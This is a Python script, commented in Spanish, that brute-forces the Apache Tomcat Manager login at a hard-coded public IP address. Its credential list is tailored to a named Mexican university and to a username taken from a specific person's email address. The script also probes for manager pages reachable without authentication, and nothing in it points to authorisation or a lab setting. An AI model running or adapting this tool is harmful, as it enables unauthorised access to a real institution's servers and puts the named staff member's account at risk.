# advanced_manager_brute.py
import requests
import base64
from concurrent.futures import ThreadPoolExecutor
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedManagerBrute:
    def __init__(self):
        self.target = "189.254.143.102"
        self.manager_urls = [
            f"https://{self.target}/manager/html",
            f"https://{self.target}/manager/status",
            f"http://{self.target}/manager/html"
        ]
        
    def try_credentials(self, credentials):
        """Intenta un conjunto de credenciales"""
        username, password = credentials
        
        for manager_url in self.manager_urls:
            try:
                response = requests.get(
                    manager_url,
                    auth=(username, password),
                    verify=False,
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"🎉 CREDENCIALES VÁLIDAS ENCONTRADAS!")
                    print(f"   URL: {manager_url}")
                    print(f"   Usuario: {username}")
                    print(f"   Contraseña: {password}")
                    
                    # Verificar nivel de acceso
                    if "Tomcat Web Application Manager" in response.text:
                        print("   📊 Acceso COMPLETO al Manager")
                    elif "Tomcat Status" in response.text:
                        print("   📈 Acceso al Status")
                        
                    return True
                    
            except Exception as e:
                continue
                
        return False

    def generate_credential_variations(self):
        """Genera variaciones de credenciales basadas en el contexto UTSLP"""
        base_credentials = [
            # Basado en hnieto@utslp.edu.mx
            ("hnieto", "utslp"), ("hnieto", "Utslp2024"), ("hnieto", "Hnieto123"),
            ("hnieto", "utslp.edu.mx"), ("hnieto", "UTSLP"), ("hnieto", "Hnieto@123"),
            
            # Usuarios comunes de Tomcat
            ("admin", "admin"), ("tomcat", "tomcat"), ("both", "tomcat"),
            ("role1", "role1"), ("root", "root"), ("manager", "manager"),
            
            # Combinaciones con el dominio
            ("admin", "utslp"), ("tomcat", "utslp"), ("manager", "utslp"),
            ("sito", "sito"), ("sito", "utslp"), ("sito", "Sito123"),
            
            # Basado en el contexto educativo
            ("administrator", "utslp"), ("sysadmin", "utslp"), ("webmaster", "utslp"),
            ("dev", "utslp"), ("test", "utslp"), ("demo", "utslp"),
        ]
        
        return base_credentials

    def brute_force_manager(self):
        """Ejecuta fuerza bruta mejorada"""
        print("=== FUERZA BRUTA AVANZADA TOMCAT MANAGER ===")
        
        credentials = self.generate_credential_variations()
        print(f"Probando {len(credentials)} combinaciones...")
        
        found = False
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(self.try_credentials, credentials)
            for i, result in enumerate(results):
                if result:
                    found = True
                    break
                    
        if not found:
            print("❌ No se encontraron credenciales válidas")

    def test_default_configs(self):
        """Prueba configuraciones por defecto y vulnerabilidades"""
        print("\n[+] Probando configuraciones por defecto...")
        
        # Intentar acceso sin autenticación
        for manager_url in self.manager_urls:
            try:
                response = requests.get(manager_url, verify=False, timeout=5)
                if response.status_code != 401:
                    print(f"⚠️  Acceso posible sin autenticación a {manager_url}")
            except:
                pass

# Ejecutar
if __name__ == "__main__":
    brute_forcer = AdvancedManagerBrute()
    brute_forcer.brute_force_manager()
    brute_forcer.test_default_configs()